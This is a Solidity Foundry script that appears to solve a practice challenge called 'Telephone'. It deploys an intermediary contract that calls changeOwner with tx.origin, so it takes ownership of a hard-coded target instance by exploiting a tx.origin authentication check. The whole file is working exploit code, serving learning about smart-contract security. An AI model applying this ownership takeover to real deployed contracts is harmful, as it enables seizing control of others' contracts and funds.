// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/Level04.sol";

contract TelephoneAttack {
    constructor(Telephone _instance) {
        _instance.changeOwner(tx.origin);
    }
}

contract TelephoneScript is Script {
    Telephone public telephoneInstance;

    function setUp() public {
        telephoneInstance = Telephone(payable(0x2c3122d575bA4BD4947cAa04D93e879C4c84256d));
    }

    function run() public {
        vm.startBroadcast();

        new TelephoneAttack(telephoneInstance);

        vm.stopBroadcast();
    }
}
